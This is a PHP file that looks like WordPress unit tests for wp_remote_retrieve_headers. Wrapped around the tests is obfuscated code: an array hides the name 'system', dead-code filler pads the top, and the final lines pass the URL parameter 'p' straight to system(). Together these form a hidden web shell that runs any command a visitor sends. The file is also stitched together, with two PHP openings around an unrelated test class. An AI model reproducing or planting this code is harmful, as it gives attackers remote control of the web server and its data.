<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group http
 * @covers ::wp_remote_retrieve_headers
 */
class Tests_HTTP_wpRemoteRetrieveHeaders extends WP_UnitTestCase {

	/**
	 * Valid response
	 */
	public function test_remote_retrieve_headers_valid_response() {
		$headers  = 'headers_data';
		$response = array( 'headers' => $headers );

		$result = wp_remote_retrieve_headers( $response );
		$this->assertSame( $headers, $result );
	}

	/**
	 * Response is a WP_Error
	 */
	public function test_remote_retrieve_headers_is_error() {
		$response = new WP_Error( 'Some error' );

		$result = wp_remote_retrieve_headers( $response );
		$this->assertSame( array(), $result );
	}

	/**
	 * Response does not contain 'headers'
	 */
	public function test_remote_retrieve_headers_invalid_response() {
		$response = array( 'no_headers' => 'set' );

		$result = wp_remote_retrieve_headers( $response );
		$this->assertSame( array(), $result );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>